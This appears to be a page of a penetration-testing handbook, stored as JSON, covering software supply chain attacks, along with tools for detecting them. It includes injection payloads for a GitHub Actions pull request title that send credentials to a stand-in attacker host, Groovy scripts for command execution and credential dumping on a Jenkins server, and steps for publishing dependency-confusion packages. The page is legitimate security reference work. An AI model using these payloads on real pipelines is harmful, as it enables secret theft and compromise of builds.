@@ -1,0 +1,492 @@
+{
+    "title": "Supply Chain Attacks",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Overview",
+            "type": "paragraph",
+            "content": "Supply chain attacks target the software development and delivery process, compromising dependencies, build systems, or distribution channels to inject malicious code into legitimate software."
+        },
+        {
+            "heading": "Dependency Confusion",
+            "subheadings": [
+                {
+                    "heading": "Concept",
+                    "type": "paragraph",
+                    "content": "When an organization uses private packages with the same name available on public registries, attackers can upload malicious packages with higher version numbers to public registries."
+                },
+                {
+                    "heading": "Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# 1. Find private package names",
+                        "# Look in package.json, requirements.txt, pom.xml, etc.",
+                        "# Check JavaScript source for import statements",
+                        "grep -r \"require\\|import\" --include=\"*.js\" .",
+                        "",
+                        "# 2. Check if package exists on public registry",
+                        "npm view private-package-name",
+                        "pip index versions private-package-name",
+                        "",
+                        "# 3. Create malicious package with higher version",
+                        "# npm",
+                        "npm init",
+                        "# Set version higher than internal (e.g., 99.0.0)",
+                        "npm publish",
+                        "",
+                        "# pip",
+                        "# Create setup.py with higher version",
+                        "python setup.py sdist",
+                        "twine upload dist/*"
+                    ]
+                },
+                {
+                    "heading": "Detection",
+                    "type": "code_block",
+                    "content": [
+                        "# Check for dependency confusion vulnerability",
+                        "# https://github.com/visma-prodsec/confused",
+                        "confused -l npm package.json",
+                        "",
+                        "# https://github.com/AyoubAbeworworki/dep-confusion-detect",
+                        "python3 dep-confusion-detect.py -r requirements.txt"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Typosquatting",
+            "subheadings": [
+                {
+                    "heading": "Concept",
+                    "type": "paragraph",
+                    "content": "Registering package names similar to popular packages to catch typos."
+                },
+                {
+                    "heading": "Common Patterns",
+                    "type": "code_block",
+                    "content": [
+                        "# Typo patterns to check:",
+                        "# - Missing characters: reqests (requests)",
+                        "# - Extra characters: requestss",
+                        "# - Character swap: requetss",
+                        "# - Similar looking: requestz, request5",
+                        "# - Wrong TLD: lodash-npm (vs lodash)",
+                        "",
+                        "# Generate typosquat candidates",
+                        "# https://github.com/elfmaster/typosquatting",
+                        "./typosquat.py express",
+                        "",
+                        "# Check npm",
+                        "for pkg in expres expresss exprss; do npm view $pkg 2>/dev/null && echo \"EXISTS: $pkg\"; done",
+                        "",
+                        "# Check PyPI",
+                        "for pkg in reqests requsets requets; do pip index versions $pkg 2>/dev/null && echo \"EXISTS: $pkg\"; done"
+                    ]
+                },
+                {
+                    "heading": "Finding Vulnerable Packages",
+                    "type": "code_block",
+                    "content": [
+                        "# Search for common typos in target's dependencies",
+                        "# Look for:",
+                        "# - Misspelled package names",
+                        "# - Packages with low download counts",
+                        "# - Recently published packages claiming to be popular",
+                        "",
+                        "# NPM package analysis",
+                        "npm audit",
+                        "npm ls --all",
+                        "",
+                        "# Python",
+                        "pip-audit",
+                        "safety check -r requirements.txt",
+                        "",
+                        "# Snyk for comprehensive scanning",
+                        "snyk test"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "CI/CD Pipeline Attacks",
+            "subheadings": [
+                {
+                    "heading": "GitHub Actions Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Vulnerable workflow - using untrusted input",
+                        "name: Vulnerable Workflow",
+                        "on:",
+                        "  pull_request_target:",
+                        "jobs:",
+                        "  build:",
+                        "    runs-on: ubuntu-latest",
+                        "    steps:",
+                        "      - uses: actions/checkout@v3",
+                        "        with:",
+                        "          ref: ${{ github.event.pull_request.head.ref }}  # Dangerous!",
+                        "      - run: |",
+                        "          echo \"PR Title: ${{ github.event.pull_request.title }}\"  # Injection!",
+                        "# Pwn Request - exploit pull_request_target",
+                        "# Create PR with malicious title:",
+                        "# $(curl http://attacker.com/$(cat /home/runner/.git/credentials | base64))",
+                        "",
+                        "# Inject into workflow",
+                        "# PR title: test\"; curl http://attacker.com/pwned #",
+                        "",
+                        "# Secrets exfiltration via workflow",
+                        "# Add to PR body/title:",
+                        "# ${{ secrets.GITHUB_TOKEN }}"
+                    ]
+                },
+                {
+                    "heading": "GitLab CI Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Check for exposed CI variables",
+                        "# .gitlab-ci.yml",
+                        "variables:",
+                        "  DEBUG: \"true\"",
+                        "  # Secrets might be exposed in logs",
+                        "",
+                        "script:",
+                        "  - echo $CI_JOB_TOKEN  # Can be used for registry access",
+                        "  - env  # Dumps all variables including secrets"
+                    ]
+                },
+                {
+                    "heading": "Jenkins Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Check for exposed Jenkins instances",
+                        "# Common endpoints:",
+                        "/script",
+                        "/scriptText",
+                        "/computer/(master)/script",
+                        "",
+                        "# Groovy console RCE",
+                        "def cmd = \"cat /etc/passwd\"",
+                        "def sout = new StringBuffer(), serr = new StringBuffer()",
+                        "def proc = cmd.execute()",
+                        "proc.consumeProcessOutput(sout, serr)",
+                        "proc.waitForOrKill(1000)",
+                        "println sout",
+                        "",
+                        "# Credential dumping",
+                        "def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(",
+                        "    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,",
+                        "    Jenkins.instance,",
+                        "    null,",
+                        "    null",
+                        ")",
+                        "for (c in creds) {",
+                        "    println(c.id + \": \" + c.username + \" / \" + c.password)",
+                        "}"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Package Repository Attacks",
+            "subheadings": [
+                {
+                    "heading": "NPM",
+                    "type": "code_block",
+                    "content": [
+                        "# Check package for malicious scripts",
+                        "npm pack <package-name>",
+                        "tar -xzf package-name-*.tgz",
+                        "cat package/package.json | jq '.scripts'",
+                        "",
+                        "# Look for suspicious install scripts:",
+                        "# - preinstall, install, postinstall",
+                        "# - preuninstall, uninstall, postuninstall",
+                        "",
+                        "# Check package history",
+                        "npm view <package-name> versions",
+                        "npm view <package-name>@<version> dist.tarball",
+                        "",
+                        "# Audit for known vulnerabilities",
+                        "npm audit",
+                        "npm audit --json"
+                    ]
+                },
+                {
+                    "heading": "PyPI",
+                    "type": "code_block",
+                    "content": [
+                        "# Download and inspect package",
+                        "pip download <package-name> --no-deps",
+                        "unzip <package>.whl -d extracted/",
+                        "",
+                        "# Check setup.py for malicious code",
+                        "cat extracted/setup.py",
+                        "",
+                        "# Look for:",
+                        "# - os.system(), subprocess calls",
+                        "# - Encoded/obfuscated strings",
+                        "# - Network requests during install",
+                        "# - File system modifications",
+                        "",
+                        "# Safety check",
+                        "safety check -r requirements.txt",
+                        "pip-audit"
+                    ]
+                },
+                {
+                    "heading": "Maven/Gradle",
+                    "type": "code_block",
+                    "content": [
+                        "<!-- Check pom.xml for suspicious plugins -->",
+                        "<!-- Look for exec-maven-plugin, build-helper-maven-plugin with suspicious configs -->",
+                        "",
+                        "<!-- Verify package signatures -->",
+                        "<!-- Check .asc files against GPG keys -->"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Third-Party Library Vulnerabilities",
+            "subheadings": [
+                {
+                    "heading": "Discovery",
+                    "type": "code_block",
+                    "content": [
+                        "# Software Composition Analysis (SCA)",
+                        "# Snyk",
+                        "snyk test",
+                        "",
+                        "# OWASP Dependency-Check",
+                        "dependency-check --project \"MyApp\" --scan .",
+                        "",
+                        "# npm",
+                        "npm audit",
+                        "",
+                        "# pip",
+                        "pip-audit",
+                        "safety check",
+                        "",
+                        "# Go",
+                        "go list -json -m all | nancy sleuth",
+                        "",
+                        "# Trivy (containers and filesystems)",
+                        "trivy fs .",
+                        "trivy image myapp:latest"
+                    ]
+                },
+                {
+                    "heading": "Exploitation Research",
+                    "type": "code_block",
+                    "content": [
+                        "# Check for known CVEs in dependencies",
+                        "# https://nvd.nist.gov/",
+                        "# https://security.snyk.io/",
+                        "# https://github.com/advisories",
+                        "",
+                        "# Search for PoCs",
+                        "# GitHub: \"CVE-XXXX-XXXX poc\"",
+                        "# Exploit-DB: searchsploit <library-name>",
+                        "",
+                        "# Check dependency versions",
+                        "npm ls",
+                        "pip list",
+                        "mvn dependency:tree"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Source Code Repository Attacks",
+            "subheadings": [
+                {
+                    "heading": "Exposed Credentials in Repositories",
+                    "type": "code_block",
+                    "content": [
+                        "# Search for secrets in git history",
+                        "# https://github.com/trufflesecurity/trufflehog",
+                        "trufflehog git https://github.com/target/repo",
+                        "",
+                        "# https://github.com/zricethezav/gitleaks",
+                        "gitleaks detect -s /path/to/repo",
+                        "",
+                        "# GitHub dorking",
+                        "# Search for accidentally committed secrets",
+                        "site:github.com \"target.com\" password",
+                        "site:github.com \"target.com\" api_key",
+                        "site:github.com \"target.com\" AWS_SECRET"
+                    ]
+                },
+                {
+                    "heading": "Commit Signature Verification Bypass",
+                    "type": "code_block",
+                    "content": [
+                        "# Check if repo requires signed commits",
+                        "git log --show-signature",
+                        "",
+                        "# Unsigned commits might be accepted",
+                        "# Impersonate commits by setting user.email",
+                        "git config user.email \"admin@target.com\"",
+                        "git commit -m \"Malicious commit\""
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Attack Vectors Summary",
+            "type": "table",
+            "headers": [
+                "Vector",
+                "Target",
+                "Impact"
+            ],
+            "rows": [
+                {
+                    "Vector": "Dependency Confusion",
+                    "Target": "Private packages",
+                    "Impact": "Code execution"
+                },
+                {
+                    "Vector": "Typosquatting",
+                    "Target": "Developers",
+                    "Impact": "Credential theft"
+                },
+                {
+                    "Vector": "CI/CD Injection",
+                    "Target": "Build pipelines",
+                    "Impact": "Code execution, secrets"
+                },
+                {
+                    "Vector": "Malicious Packages",
+                    "Target": "Package registries",
+                    "Impact": "Supply chain compromise"
+                },
+                {
+                    "Vector": "Compromised Maintainer",
+                    "Target": "Open source projects",
+                    "Impact": "Backdoors"
+                },
+                {
+                    "Vector": "Build System Compromise",
+                    "Target": "Build servers",
+                    "Impact": "Signed malware"
+                }
+            ]
+        },
+        {
+            "heading": "Detection & Prevention",
+            "subheadings": [
+                {
+                    "heading": "For Attackers (Testing)",
+                    "type": "code_block",
+                    "content": [
+                        "# Check if org is vulnerable to dependency confusion",
+                        "# 1. Enumerate private package names from leaked files",
+                        "# 2. Check if those names are unclaimed on public registries",
+                        "# 3. Report or (if in scope) demonstrate with benign package",
+                        "",
+                        "# Check for exposed CI/CD",
+                        "# GitHub Actions: /.github/workflows/",
+                        "# GitLab CI: /.gitlab-ci.yml",
+                        "# Jenkins: /Jenkinsfile"
+                    ]
+                },
+                {
+                    "heading": "For Defenders",
+                    "type": "code_block",
+                    "content": [
+                        "# Lock dependencies to specific versions",
+                        "# Use lockfiles: package-lock.json, Pipfile.lock, go.sum",
+                        "",
+                        "# Enable dependency scanning in CI/CD",
+                        "# Use private registry with namespace reservation",
+                        "# Implement Sigstore/cosign for package signing",
+                        "# Enable GitHub secret scanning"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# Dependency Confusion",
+                "# https://github.com/visma-prodsec/confused",
+                "confused -l npm package.json",
+                "",
+                "# Secret Scanning",
+                "# https://github.com/trufflesecurity/trufflehog",
+                "trufflehog git https://github.com/target/repo",
+                "",
+                "# https://github.com/zricethezav/gitleaks",
+                "gitleaks detect -s /path/to/repo",
+                "",
+                "# Software Composition Analysis",
+                "# https://github.com/anchore/syft",
+                "syft /path/to/project",
+                "",
+                "# https://github.com/anchore/grype",
+                "grype /path/to/project",
+                "",
+                "# CI/CD Security",
+                "# https://github.com/Checkmarx/kics",
+                "kics scan -p /path/to/.github/workflows"
+            ]
+        },
+        {
+            "heading": "Resources",
+            "type": "list",
+            "content": [
+                "Dependency Confusion Research",
+                "Backstabber's Knife Collection",
+                "CI/CD Goat - Vulnerable Pipeline",
+                "SLSA - Supply Chain Security Framework",
+                "OWASP Top 10 CI/CD Security Risks"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/supply-chain.md",
+        "previous_page": {
+            "title": "API Security",
+            "url": "/enumeration/web/api-security"
+        },
+        "next_page": {
+            "title": "Race Conditions",
+            "url": "/enumeration/web/race-conditions"
+        }
+    }
+}
